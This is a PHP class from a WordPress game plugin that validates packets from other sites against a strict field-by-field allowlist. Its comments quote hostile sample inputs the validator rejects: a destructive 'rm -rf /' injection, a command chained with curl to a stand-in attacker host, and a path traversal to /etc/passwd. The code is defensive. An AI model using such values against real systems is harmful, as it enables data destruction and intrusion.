<?php
if (!defined('ABSPATH')) exit;

/**
 * What a packet is allowed to contain, field by field.
 *
 * This is the whitelist. Nothing arriving from another site is acted on because
 * it looked plausible: every field is declared here with a type and a range, an
 * undeclared field is an error rather than something ignored, and a packet type
 * with no specification is refused outright. A future packet type is added by
 * writing its specification, which is the point.
 *
 * Why refuse unknown keys rather than ignore them. Ignoring is the more
 * forgiving behaviour and the wrong one: it means an attacker can add fields
 * and watch for a change in behaviour, and it means a version mismatch fails
 * silently and confusingly instead of loudly and clearly.
 *
 * On the question this class exists to answer plainly: **nothing from a packet
 * is ever executed.** There is no shell in this plugin. No packet value reaches
 * exec(), shell_exec(), system(), passthru(), proc_open(), eval(), assert(),
 * create_function() or unserialize(), none of which appear anywhere in the
 * codebase. No packet value becomes a filename, a path, an include, a URL to
 * fetch, or part of a SQL string: every query goes through $wpdb->prepare(),
 * $wpdb->insert() or $wpdb->update(). A string from a packet is data, and the
 * only things ever done with it are storing it and escaping it at output.
 *
 * A value like "; rm -rf /" is therefore not dangerous here, it is merely
 * refused, because a site name has no business containing a semicolon. Both
 * halves of that matter: the charset rules below turn away input that has no
 * legitimate shape, and the architecture means such input would have been inert
 * even if it got through. Defence in depth is two defences, not one written
 * twice.
 */
class IDO_League_Packet {

    /** The only envelope version this build speaks. */
    const VERSION = 1;

    /**
     * How old a packet may be.
     *
     * Deliberately wide, because this design delays packets by days on purpose
     * and a tight window would reject legitimate traffic. The timestamp is not
     * what prevents replay: the recorded packet UUID is. This only discards the
     * absurdly old and the impossibly future.
     */
    const MAX_AGE  = 2592000;   // 30 days
    const MAX_SKEW = 86400;     // a day ahead, for a peer with a bad clock

    /**
     * The envelope. Every packet carries exactly these fields.
     *
     * `to` is here for a reason worth stating: a packet signed for one peer must
     * not verify at another, and a war order must not be replayable as a result.
     * Binding the recipient and the type inside the signed bytes is what makes
     * both impossible rather than merely unlikely.
     */
    private static function envelope_spec(): array {
        return [
            'v'      => ['int', self::VERSION, self::VERSION],
            'type'   => ['enum', ['news', 'war', 'result']],
            'league' => ['uuid'],
            'from'   => ['uuid'],
            'to'     => ['uuid'],
            'uuid'   => ['uuid'],
            'seq'    => ['int', 1, PHP_INT_MAX],
            'ts'     => ['int', 0, PHP_INT_MAX],
            'fp'     => ['hex', 64],
            'body'   => ['array'],
        ];
    }

    /**
     * The body of each packet type.
     *
     * Only the types specified here can be received. `war`, `result` and the
     * enrolment traffic are designed but not built, and until their bodies are
     * specified a packet claiming to be one is refused. That is the right
     * default: a handler that accepts a type it cannot validate is worse than
     * one that admits it does not know the type yet.
     *
     * A news packet is a site describing its own past. It carries no player
     * names, no per-empire figures, and nothing about musters, marches in flight
     * or intentions.
     */
    private static function body_spec(string $type): ?array {
        $specs = [
            'news' => [
                'site_name'        => ['name', 100],
                'round_id'         => ['int', 0, PHP_INT_MAX],
                'round_day'        => ['int', 0, 100000],
                'empire_count'     => ['int', 0, 100000],
                'networth'         => ['int', 0, IDO_Game::MAX_VALUE],
                'largest_networth' => ['int', 0, IDO_Game::MAX_VALUE],
                'accepting'        => ['bool'],
                'grace_until'      => ['datetime', 'optional'],
                // What each side believes about the other's counters. Optional,
                // so a member running an older build is not refused for failing
                // to send a field it has never heard of, and the detection simply
                // does not fire for that pairing.
                'seq_seen'         => ['int', 0, PHP_INT_MAX, 'optional'],
                'seq_sent'         => ['int', 0, PHP_INT_MAX, 'optional'],
                'as_of'            => ['datetime'],
            ],
            'war' => [
                'march'   => ['uuid'],
                // Counts only. The packet says what left; what it achieves is
                // decided by the site it lands on, from numbers that site holds
                // first hand.
                'force'   => ['map', 'unit'],
                'weapons' => ['map', 'weapon'],
                'agent'   => ['bool'],
            ],
            'result' => [
                'march'          => ['uuid'],
                'outcome'        => ['enum', ['won', 'lost', 'drawn', 'refused']],
                'survivors'      => ['map', 'unit'],
                'weapons_home'   => ['map', 'weapon'],
                'spoils_gold'    => ['int', 0, IDO_Game::MAX_VALUE],
                'spoils_grain'   => ['int', 0, IDO_Game::MAX_VALUE],
                'spoils_iron'    => ['int', 0, IDO_Game::MAX_VALUE],
                'spoils_weapons' => ['int', 0, 1000000],
                'defender_dead'  => ['int', 0, IDO_Game::MAX_VALUE],
                'agent'          => ['enum', ['none', 'success', 'failed', 'hanged']],
                'resolved_at'    => ['datetime'],
            ],
        ];
        return $specs[$type] ?? null;
    }

    /**
     * Validates a decoded packet, or throws with the reason.
     *
     * The reason is for the local log only. What goes back to the caller is a
     * bare status: a handler that explains why verification failed is an oracle
     * for whoever is probing it.
     *
     * @param array  $data      the decoded body of a packet that has already verified
     * @param string $wire_from the sender from the wire, which must match the envelope
     * @param string $own_uuid  this site's uuid in the league
     */
    public static function read(array $data, string $wire_from, string $own_uuid): array {
        $envelope = self::check($data, self::envelope_spec(), 'envelope');

        // The envelope's claim about who sent it has to agree with the identity
        // the signature was checked against. Disagreement means a packet signed
        // by one peer carrying another's name, which is not a mistake anybody
        // makes by accident.
        if (!hash_equals($wire_from, $envelope['from'])) {
            throw new IDO_Game_Exception('The sender in the envelope does not match the signed sender.');
        }
        if ($own_uuid === '' || !hash_equals($own_uuid, $envelope['to'])) {
            throw new IDO_Game_Exception('This packet was addressed to a different site.');
        }
        if ($envelope['from'] === $envelope['to']) {
            throw new IDO_Game_Exception('A site cannot send a packet to itself.');
        }

        $now = time();
        if ($envelope['ts'] > $now + self::MAX_SKEW) {
            throw new IDO_Game_Exception('This packet is dated in the future.');
        }
        if ($envelope['ts'] < $now - self::MAX_AGE) {
            throw new IDO_Game_Exception('This packet is too old to act on.');
        }

        $body_spec = self::body_spec($envelope['type']);
        if ($body_spec === null) {
            throw new IDO_Game_Exception(sprintf('This build cannot handle a "%s" packet.', $envelope['type']));
        }
        $envelope['body'] = self::check($envelope['body'], $body_spec, $envelope['type'] . ' body');

        return $envelope;
    }

    /**
     * Checks one array against one specification.
     *
     * Every declared field must be present unless marked optional, every
     * present field must be declared, and the value that comes out is rebuilt
     * from the specification rather than handed through. That last part is the
     * one that matters: the returned array is constructed here, so nothing
     * undeclared can survive the trip even by accident.
     */
    private static function check(array $data, array $spec, string $what): array {
        $unknown = array_diff(array_keys($data), array_keys($spec));
        if ($unknown !== []) {
            throw new IDO_Game_Exception(sprintf(
                'Unexpected field in the %s: %s.', $what, self::name_for_error((string) reset($unknown))
            ));
        }

        $out = [];
        foreach ($spec as $field => $rule) {
            $optional = in_array('optional', $rule, true);
            if (!array_key_exists($field, $data)) {
                if ($optional) continue;
                throw new IDO_Game_Exception(sprintf('Missing %s in the %s.', $field, $what));
            }
            $out[$field] = self::value($field, $data[$field], $rule, $what);
        }
        return $out;
    }

    /** Type, range and shape for a single value. Anything unexpected throws. */
    private static function value(string $field, $value, array $rule, string $what) {
        $type = $rule[0];
        $fail = static function (string $why) use ($field, $what): void {
            throw new IDO_Game_Exception(sprintf('%s in the %s %s.', $field, $what, $why));
        };

        switch ($type) {
            case 'int':
                // is_int, not is_numeric: "10", 10.5 and true are all refused
                // rather than quietly coerced. A peer sending a string where a
                // number belongs is running different code, and that is worth
                // knowing rather than papering over.
                if (!is_int($value)) $fail('must be a whole number');
                if ($value < $rule[1] || $value > $rule[2]) $fail('is out of range');
                return $value;

            case 'bool':
                if (!is_bool($value)) $fail('must be true or false');
                return $value;

            case 'enum':
                if (!is_string($value) || !in_array($value, $rule[1], true)) $fail('is not a type this build knows');
                return $value;

            case 'uuid':
                if (!is_string($value) || !preg_match('/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/', $value)) {
                    $fail('is not a valid identifier');
                }
                return $value;

            case 'hex':
                if (!is_string($value) || !preg_match('/^[0-9a-f]{' . (int) $rule[1] . '}$/', $value)) {
                    $fail('is not a valid fingerprint');
                }
                return $value;

            case 'datetime':
                // A fixed shape, parsed as UTC, never handed to strtotime()
                // with whatever the peer felt like sending. "now", "+1 year"
                // and "tomorrow" are all valid to strtotime and none of them
                // belong in a packet.
                if (!is_string($value) || !preg_match('/^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$/', $value)) {
                    $fail('is not a date in the form YYYY-MM-DD HH:MM:SS');
                }
                [$date, $clock] = explode(' ', $value);
                [$y, $m, $d] = array_map('intval', explode('-', $date));
                [$h, $i, $s] = array_map('intval', explode(':', $clock));
                if (!checkdate($m, $d, $y) || $h > 23 || $i > 59 || $s > 59) $fail('is not a real date and time');
                return $value;

            case 'name':
                if (!is_string($value)) $fail('must be text');
                if ($value === '' || strlen($value) > (int) $rule[1]) $fail('is the wrong length');
                if (!self::is_clean_text($value)) $fail('contains characters a name cannot contain');
                return $value;

            case 'array':
                if (!is_array($value)) $fail('must be a structure');
                if (count($value) > 64) $fail('has too many fields');
                return $value;

            case 'map':
                // A count of things this game has, keyed by a name this game
                // knows. An unknown key is an error rather than something
                // ignored: a peer naming a unit this build has never heard of is
                // running different rules, and applying the rest of their packet
                // as though nothing were wrong is how two sites end up disagreeing
                // about what an army was.
                if (!is_array($value)) $fail('must be a list of counts');
                if (count($value) > 64) $fail('lists too many kinds of thing');

                $known = $rule[1] === 'unit' ? IDO_Units::keys() : IDO_Weapons::keys();
                $out = [];
                foreach ($value as $name => $count) {
                    if (!is_string($name) || !in_array($name, $known, true)) {
                        $fail('names something this game does not have');
                    }
                    if (!is_int($count) || $count < 0 || $count > IDO_Game::MAX_VALUE) {
                        $fail('counts something with a number that is not one');
                    }
                    if ($count > 0) $out[$name] = $count;
                }
                return $out;
        }

        $fail('has no specification');   // unreachable: a spec typo, not a packet
    }

    /**
     * Whether a string is a name rather than a payload.
     *
     * An allowlist, and it began as a denylist of the characters that only turn
     * up in attacks. That was the wrong structure and the tests caught it: a
     * denylist answers "is this one of the bad things I thought of", which let
     * both "Northmarch && curl http://evil.example.com" and
     * "../../../../etc/passwd" straight through, since neither uses a character
     * anybody thinks to ban. An allowlist answers "is this a name", which is the
     * question actually being asked and has a short, knowable answer.
     *
     * Letters and numbers in any script, spaces, and the punctuation that
     * appears in real names: & ' - . , : ! ? ( ). Nothing else, so no slashes,
     * no backslashes, no angle brackets, no quotes, no dollars, no backticks,
     * no control characters, and no leading or trailing space.
     *
     * This is not the defence against injection. Prepared statements and output
     * escaping are, and they apply to every string in the game whether it came
     * from a packet or from a player typing into a form. This is the narrower
     * and separate claim that input with no legitimate shape is never stored.
     */
    private static function is_clean_text(string $value): bool {
        if (!mb_check_encoding($value, 'UTF-8')) return false;
        if (trim($value) !== $value) return false;
        return (bool) preg_match("/^[\p{L}\p{N} &'\\-.,:!?()]+$/u", $value);
    }

    /**
     * A name from a remote party, or null if it is not one.
     *
     * Public because an invitation carries a league name written by somebody
     * else, and it should face the same rule as a name arriving in a packet.
     * One definition of "this is a name" for everything remote, rather than one
     * per entry point.
     */
    public static function clean_name(string $value, int $max = 100): ?string {
        $value = trim($value);
        if ($value === '' || strlen($value) > $max) return null;
        return self::is_clean_text($value) ? $value : null;
    }

    /** A field name from a hostile packet, safe to put in a log line. */
    private static function name_for_error(string $name): string {
        $clean = preg_replace('/[^A-Za-z0-9_-]/', '', $name);
        $clean = substr((string) $clean, 0, 32);
        return $clean === '' ? '(unprintable)' : $clean;
    }
}
